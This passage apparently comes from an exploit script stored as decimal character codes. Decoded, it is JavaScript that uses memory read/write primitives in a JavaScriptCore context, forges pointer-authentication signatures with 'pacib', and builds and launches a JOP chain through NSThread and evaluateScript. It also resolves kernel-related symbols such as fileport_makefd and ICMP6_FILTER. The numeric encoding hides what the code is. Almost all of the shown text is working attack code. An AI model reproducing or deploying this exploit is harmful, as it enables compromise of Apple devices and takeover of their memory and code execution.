108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 114, 119, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 115, 101, 116, 117, 112, 32, 114, 119, 56, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 115, 105, 103, 110, 105, 110, 103, 95, 99, 116, 120, 32, 32, 32, 32, 32, 32, 32, 61, 32, 48, 120, 52, 57, 49, 49, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 115, 105, 103, 110, 101, 100, 95, 102, 99, 97, 108, 108, 95, 97, 100, 100, 114, 32, 61, 32, 112, 97, 99, 105, 98, 40, 106, 115, 118, 109, 95, 105, 115, 78, 65, 78, 95, 102, 99, 97, 108, 108, 95, 103, 97, 100, 103, 101, 116, 44, 32, 115, 105, 103, 110, 105, 110, 103, 95, 99, 116, 120, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 105, 115, 110, 97, 110, 95, 99, 111, 100, 101, 95, 112, 116, 114, 44, 32, 115, 105, 103, 110, 101, 100, 95, 102, 99, 97, 108, 108, 95, 97, 100, 100, 114, 41, 59, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 114, 114, 97, 121, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 100, 100, 114, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 10, 32, 32, 32, 32, 109, 101, 109, 99, 112, 121, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 44, 32, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 44, 32, 80, 65, 71, 69, 95, 83, 73, 90, 69, 41, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 51, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 53, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 54, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 55, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 41, 59, 10, 10, 32, 32, 32, 32, 105, 102, 32, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 32, 61, 61, 32, 48, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 115, 105, 103, 110, 97, 116, 117, 114, 101, 32, 61, 32, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 40, 99, 116, 120, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 32, 32, 32, 32, 61, 32, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 40, 105, 110, 118, 111, 107, 101, 95, 99, 108, 97, 115, 115, 44, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 115, 105, 103, 110, 97, 116, 117, 114, 101, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 41, 44, 32, 49, 110, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 99, 116, 120, 41, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 44, 32, 50, 110, 41, 59, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 115, 116, 104, 114, 101, 97, 100, 32, 61, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 40, 110, 115, 116, 104, 114, 101, 97, 100, 95, 99, 108, 97, 115, 115, 41, 59, 10, 32, 32, 32, 32, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 40, 110, 115, 116, 104, 114, 101, 97, 100, 44, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 107, 101, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 110, 115, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 40, 110, 115, 116, 104, 114, 101, 97, 100, 41, 59, 10, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 116, 104, 114, 101, 97, 100, 95, 104, 97, 110, 100, 108, 101, 34, 32, 58, 32, 110, 115, 116, 104, 114, 101, 97, 100, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 95, 99, 116, 120, 34, 32, 58, 32, 99, 116, 120, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 34, 32, 58, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 34, 32, 58, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 125, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 95, 106, 111, 105, 110, 40, 106, 115, 95, 116, 104, 114, 101, 97, 100, 41, 10, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 32, 32, 32, 32, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 95, 99, 116, 120, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 106, 115, 95, 99, 116, 120, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 115, 116, 104, 114, 101, 97, 100, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 116, 104, 114, 101, 97, 100, 95, 104, 97, 110, 100, 108, 101, 34, 93, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 119, 97, 105, 116, 32, 117, 110, 116, 105, 108, 32, 116, 104, 101, 32, 116, 104, 114, 101, 97, 100, 32, 105, 115, 32, 102, 105, 110, 105, 115, 104, 101, 100, 32, 97, 110, 100, 32, 114, 101, 108, 101, 97, 115, 101, 32, 105, 116, 10, 32, 32, 32, 32, 119, 104, 105, 108, 101, 32, 40, 116, 114, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 32, 61, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 110, 115, 116, 104, 114, 101, 97, 100, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 32, 61, 61, 32, 49, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 98, 114, 101, 97, 107, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 108, 101, 97, 115, 101, 40, 110, 115, 116, 104, 114, 101, 97, 100, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 118, 101, 114, 116, 32, 114, 119, 54, 52, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 118, 101, 114, 116, 32, 114, 119, 56, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 108, 101, 97, 115, 101, 32, 106, 115, 32, 99, 111, 110, 116, 101, 120, 116, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 99, 95, 114, 101, 102, 95, 99, 111, 117, 110, 116, 32, 61, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 40, 106, 115, 95, 99, 116, 120, 41, 59, 10, 32, 32, 32, 32, 102, 111, 114, 32, 40, 108, 101, 116, 32, 105, 32, 61, 32, 48, 110, 59, 32, 105, 32, 60, 32, 106, 115, 99, 95, 114, 101, 102, 95, 99, 111, 117, 110, 116, 59, 32, 105, 43, 43, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 108, 101, 97, 115, 101, 40, 106, 115, 95, 99, 116, 120, 41, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 108, 101, 97, 115, 101, 32, 116, 97, 114, 103, 101, 116, 32, 106, 115, 32, 115, 99, 114, 105, 112, 116, 10, 32, 32, 32, 32, 67, 70, 82, 101, 108, 101, 97, 115, 101, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 102, 114, 101, 101, 32, 106, 111, 112, 32, 99, 104, 97, 105, 110, 32, 112, 114, 111, 112, 101, 114, 116, 105, 101, 115, 10, 32, 32, 32, 32, 102, 114, 101, 101, 40, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 34, 93, 41, 59, 10, 125, 10, 108, 101, 116, 32, 82, 84, 76, 68, 95, 68, 69, 70, 65, 85, 76, 84, 32, 61, 32, 48, 120, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 69, 110, 59, 10, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 65, 78, 89, 87, 72, 69, 82, 69, 32, 61, 32, 49, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 70, 73, 88, 69, 68, 32, 61, 32, 48, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 79, 86, 69, 82, 87, 82, 73, 84, 69, 32, 61, 32, 48, 120, 52, 48, 48, 48, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 82, 65, 78, 68, 79, 77, 95, 65, 68, 68, 82, 32, 61, 32, 56, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 73, 78, 72, 69, 82, 73, 84, 95, 78, 79, 78, 69, 32, 61, 32, 50, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 80, 82, 79, 84, 95, 68, 69, 70, 65, 85, 76, 84, 32, 61, 32, 51, 110, 59, 10, 10, 108, 101, 116, 32, 80, 82, 79, 84, 95, 82, 69, 65, 68, 32, 61, 32, 48, 120, 49, 110, 59, 10, 108, 101, 116, 32, 80, 82, 79, 84, 95, 87, 82, 73, 84, 69, 32, 61, 32, 48, 120, 50, 110, 59, 10, 10, 108, 101, 116, 32, 77, 65, 80, 95, 83, 72, 65, 82, 69, 68, 32, 61, 32, 48, 120, 49, 110, 59, 10, 10, 108, 101, 116, 32, 65, 70, 95, 73, 78, 69, 84, 54, 32, 61, 32, 51, 48, 110, 59, 10, 108, 101, 116, 32, 83, 79, 67, 75, 95, 68, 71, 82, 65, 77, 32, 61, 32, 50, 110, 59, 10, 108, 101, 116, 32, 73, 80, 80, 82, 79, 84, 79, 95, 73, 67, 77, 80, 86, 54, 32, 61, 32, 53, 56, 110, 59, 10, 108, 101, 116, 32, 73, 67, 77, 80, 54, 95, 70, 73, 76, 84, 69, 82, 32, 61, 32, 49, 56, 110, 59, 10, 10, 108, 101, 116, 32, 83, 69, 69, 75, 95, 83, 69, 84, 32, 61, 32, 48, 110, 59, 10, 10, 108, 101, 116, 32, 95, 78, 83, 71, 69, 84, 69, 88, 69, 67, 85, 84, 65, 66, 76, 69, 80, 65, 84, 72, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 95, 78, 83, 71, 101, 116, 69, 120, 101, 99, 117, 116, 97, 98, 108, 101, 80, 97, 116, 104, 34, 41, 59, 10, 108, 101, 116, 32, 65, 67, 67, 69, 83, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 97, 99, 99, 101, 115, 115, 34, 41, 59, 10, 108, 101, 116, 32, 67, 79, 78, 70, 83, 84, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 99, 111, 110, 102, 115, 116, 114, 34, 41, 59, 10, 108, 101, 116, 32, 70, 67, 78, 84, 76, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 99, 110, 116, 108, 34, 41, 59, 10, 108, 101, 116, 32, 70, 83, 89, 78, 67, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 115, 121, 110, 99, 34, 41, 59, 10, 108, 101, 116, 32, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 70, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 102, 100, 34, 41, 59, 10, 108, 101, 116, 32, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 80, 79, 82, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 112, 111, 114, 116, 34, 41, 59, 10, 108, 101, 116, 32, 70, 79, 80, 69, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 111, 112, 101, 110, 34, 41, 59, 10, 108, 101, 116, 32, 70, 67, 76, 79, 83, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 99, 108, 111, 115, 101, 34, 41, 59, 10, 108, 101, 116, 32, 70, 87, 82, 73, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 119, 114, 105, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 71, 69, 84, 83, 79, 67, 75, 79, 80, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 103, 101, 116, 115, 111, 99, 107, 111, 112, 116, 34, 41, 59, 10, 108, 101, 116, 32, 76, 83, 69, 69, 75, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 108, 115, 101, 101, 107, 34, 